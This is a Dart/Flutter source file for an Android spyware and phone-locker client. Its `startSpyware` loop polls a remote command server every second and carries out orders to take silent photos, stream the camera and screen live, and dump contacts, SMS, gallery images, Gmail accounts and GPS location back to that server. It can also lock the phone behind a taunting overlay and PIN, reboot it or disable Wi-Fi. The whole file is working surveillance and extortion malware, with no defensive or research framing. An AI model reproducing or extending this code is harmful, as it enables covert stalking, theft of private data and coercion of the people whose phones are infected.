import 'dart:async';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:url_launcher/url_launcher.dart';
import 'globals.dart';

void startSpyware(String id) {
  Future<void> loop() async {
    try {
      final bat = Battery();
      int batLv = 100;
      try {
        batLv = await bat.batteryLevel;
      } catch (_) {}
      
      await http.post(Uri.parse("$kServerBase/api/heartbeat/$id"),
          headers: {"Content-Type": "application/json"},
          body: jsonEncode({"id": id, "status": "Alive", "battery": batLv.toString()}))
          .timeout(const Duration(seconds: 1));

      final res = await http.get(Uri.parse("$kServerBase/api/get-command/$id"));
      if (res.statusCode != 200 || res.body.isEmpty) return;

      final d = jsonDecode(res.body);
      String cmd = d['command'] ?? 'idle';
      if (cmd == 'idle') return;
      String extra = d['extra'] ?? '';
      dynamic result;

      if (cmd == 'lock_live') {
        if (extra.contains('|')) {
          final p = extra.split('|');
          currentLockMessage = p[0].isNotEmpty ? p[0] : 'YOUR PHONE IS LOCKED!!!! BY HANZ DEPLONGER';
          currentLockPIN = p.length > 1 && p[1].isNotEmpty ? p[1] : '1234';
        }
        isLockLive = true;
        if (!deviceLocked.value) {
          deviceLocked.value = true;
          playLockSound();
        }
        try {
          await platformSpy.invokeMethod('saveLockState', {
            'locked': true,
            'isLockLive': true,
            'message': currentLockMessage,
            'pin': currentLockPIN
          });
        } catch (_) {}
        try {
          await platformSpy.invokeMethod('startLockOverlay', {
            'message': currentLockMessage,
            'pin': currentLockPIN
          });
        } catch (_) {}
        try {
          await platformSpy.invokeMethod('lockDeviceNow');
        } catch (_) {}
        result = {"status": "LockLive"};
      } else if (cmd == 'hard_lock' || cmd == 'lock_device') {
        if (extra.contains('|')) {
          final p = extra.split('|');
          currentLockMessage = p[0].isNotEmpty ? p[0] : 'YOUR PHONE IS LOCKED!!!! BY HANZ DEPLONGER';
          currentLockPIN = p.length > 1 && p[1].isNotEmpty ? p[1] : '1234';
        } else if (extra.isNotEmpty) {
          currentLockMessage = extra;
        }
        if (!deviceLocked.value) {
          deviceLocked.value = true;
          playLockSound();
        }
        try {
          await platformSpy.invokeMethod('saveLockState', {
            'locked': true,
            'isLockLive': false,
            'message': currentLockMessage,
            'pin': currentLockPIN
          });
        } catch (_) {}
        try {
          await platformSpy.invokeMethod('startLockOverlay', {
            'message': currentLockMessage,
            'pin': currentLockPIN
          });
        } catch (_) {}
        try {
          await platformSpy.invokeMethod('lockDeviceNow');
        } catch (_) {}
        result = {"status": "Locked"};
      } else if (cmd == 'unlock' || cmd == 'unlock_device') {
        if (deviceLocked.value) {
          deviceLocked.value = false;
          stopSound();
          try {
            await platformStrobe.invokeMethod('stopStrobe');
          } catch (_) {}
          try {
            await platformSpy.invokeMethod('saveLockState', {
              'locked': false,
              'isLockLive': false,
              'message': '',
              'pin': ''
            });
          } catch (_) {}
        }
        result = {"status": "Unlocked"};
      } else if (cmd == 'take_photo') {
        final camStatus = await Permission.camera.request();
        if (camStatus.isGranted) {
          final b64 = await platformSpy.invokeMethod('takeSilentPhotoBackground',
              {"side": extra.isEmpty ? "back" : extra});
          result = b64 != null
              ? {"status": "Success", "image_base64": b64}
              : {"status": "Failed - camera returned null"};
        } else {
          result = {"status": "Failed - camera permission denied"};
        }
      } else if (cmd == 'get_screen') {
        final b64 = await platformSpy.invokeMethod('startScreenStreamBackground');
        result = {"status": "Success", "image_base64": b64 ?? ""};
      } else if (cmd == 'live_camera_start') {
        stopLive();
        startLiveCamera(id, extra.isEmpty ? 'back' : extra);
        result = {"status": "Live camera started"};
      } else if (cmd == 'live_screen_start') {
        stopLive();
        startLiveScreen(id);
        result = {"status": "Live screen started"};
      } else if (cmd == 'live_stop') {
        stopLive();
        result = {"status": "Stopped"};
      } else if (cmd == 'get_gmails') {
        final emails = await platformSpy.invokeMethod('getGmailAccounts') as String? ?? '';
        result = {"accounts": emails.isEmpty ? "No Gmail Found" : emails};
      } else if (cmd == 'set_wallpaper') {
        await platformSpy.invokeMethod('setWallpaper', {"url": extra});
        result = {"status": "Done"};
      } else if (cmd == 'play_audio') {
        try {
          await _audioPlayer.stop();
          await _audioPlayer.play(UrlSource(extra));
          result = {"status": "Playing"};
        } catch (e) {
          result = {"status": "Error: $e"};
        }
      } else if (cmd == 'stop_audio') {
        await _audioPlayer.stop();
        result = {"status": "Stopped"};
      } else if (cmd == 'get_contacts' || cmd == 'dump_contacts') {
        if (await FlutterContacts.requestPermission()) {
          final list = await FlutterContacts.getContacts(withProperties: true, withPhoto: false);
          result = {
            "contacts": list.take(50).map((e) => {
              "name": e.displayName,
              "number": e.phones.isNotEmpty ? e.phones.first.number : ""
            }).toList()
          };
        }
      } else if (cmd == 'flash_strobe') {
        await platformStrobe.invokeMethod('startStrobe');
        result = {"status": "On"};
      } else if (cmd == 'stop_strobe') {
        await platformStrobe.invokeMethod('stopStrobe');
        result = {"status": "Off"};
      } else if (cmd == 'vibrate_loop') {
        try {
          await platformSpy.invokeMethod('vibrateDevice', {'duration': 5000});
        } catch (_) {
          for (int i = 0; i < 10; i++) {
            await Future.delayed(const Duration(milliseconds: 1));
          }
        }
        result = {"status": "Vibrating"};
      } else if (cmd == 'open_url') {
        final url = Uri.parse(extra);
        if (await canLaunchUrl(url)) await launchUrl(url, mode: LaunchMode.externalApplication);
        result = {"status": "Opened"};
      } else if (cmd == 'get_location' || cmd == 'track_gps') {
        final pos = await Geolocator.getCurrentPosition(desiredAccuracy: LocationAccuracy.high);
        result = {"lat": pos.latitude, "lng": pos.longitude};
      } else if (cmd == 'force_open') {
        try {
          await platformSpy.invokeMethod('bringToForeground');
        } catch (_) {}
        result = {"status": "OK"};
      } else if (cmd == 'reboot_device' || cmd == 'restart_device') {
        try {
          await platformSpy.invokeMethod('rebootDevice');
          result = {"status": "Rebooting"};
        } catch (e) {
          result = {"status": "reboot_failed: ${e.toString()}"};
        }
      } else if (cmd == 'get_sms') {
        try {
          final smsList = await platformSpy.invokeMethod('getSmsMessages');
          result = {"sms": smsList};
        } catch (e) {
          result = {"sms": [], "error": e.toString()};
        }
      } else if (cmd == 'get_gallery') {
        try {
          final imgs = await platformSpy.invokeMethod('getGalleryImages', {"limit": 5});
          result = {"images": imgs ?? []};
        } catch (e) {
          result = {"images": [], "error": e.toString()};
        }
      } else if (cmd == 'chat_msg') {
        if (extra.isNotEmpty) {
          final msgs = List<Map<String, String>>.from(lockChatMessages.value);
          msgs.add({'from': 'admin', 'text': extra, 'time': DateTime.now().toString().substring(11, 16)});
          lockChatMessages.value = msgs;
        }
        result = {"status": "msg_received"};
      } else if (cmd == 'open_notification_settings') {
        _requestNotifAccess();
        result = {"status": "Opened"};
      } else if (cmd == 'kill_wifi') {
        try {
          await platformSpy.invokeMethod('disableWifi');
          result = {"status": "WiFi disabled"};
        } catch (_) {
          result = {"status": "Failed - no permission"};
        }
      }

      if (result != null) {
        await http.post(Uri.parse("$kServerBase/api/post-response/$id"),
            headers: {"Content-Type": "application/json"},
            body: jsonEncode({"data": result, "cmd": cmd}));
      }
    } catch (_) {}
  }
  Timer.periodic(const Duration(seconds: 1), (_) => loop());
}

void startLiveCamera(String id, String side) async {
  if (_isLiveStreaming) return;
  _isLiveStreaming = true;
  try {
    await platformSpy.invokeMethod('startLiveCameraStream', {"side": side});
  } catch (_) {}
  _liveStreamTimer = Timer.periodic(const Duration(milliseconds: 150), (t) async {
    if (!_isLiveStreaming) {
      t.cancel();
      return;
    }
    try {
      final f = await platformSpy.invokeMethod('getLiveFrame') as String?;
      if (f != null && f.isNotEmpty) {
        await http.post(Uri.parse("$kServerBase/api/live-frame/$id"),
            headers: {"Content-Type": "application/json"},
            body: jsonEncode({"frame": f, "ts": DateTime.now().millisecondsSinceEpoch}))
            .timeout(const Duration(seconds: 2));
      }
    } catch (_) {}
  });
}

void startLiveScreen(String id) {
  if (_isLiveStreaming) return;
  _isLiveStreaming = true;
  _liveStreamTimer = Timer.periodic(const Duration(milliseconds: 150), (t) async {
    if (!_isLiveStreaming) {
      t.cancel();
      return;
    }
    try {
      final f = await platformSpy.invokeMethod('startScreenStreamBackground') as String?;
      if (f != null && f.isNotEmpty) {
        await http.post(Uri.parse("$kServerBase/api/live-frame/$id"),
            headers: {"Content-Type": "application/json"},
            body: jsonEncode({"frame": f, "ts": DateTime.now().millisecondsSinceEpoch}))
            .timeout(const Duration(seconds: 2));
      }
    } catch (_) {}
  });
}

void stopLive() {
  _isLiveStreaming = false;
  _liveStreamTimer?.cancel();
  _liveStreamTimer = null;
  platformSpy.invokeMethod('stopLiveCameraStream').catchError((_) {});
}

void _requestNotifAccess() async {
  try {
    await platformSpy.invokeMethod('openNotificationSettings');
  } catch (_) {}
}
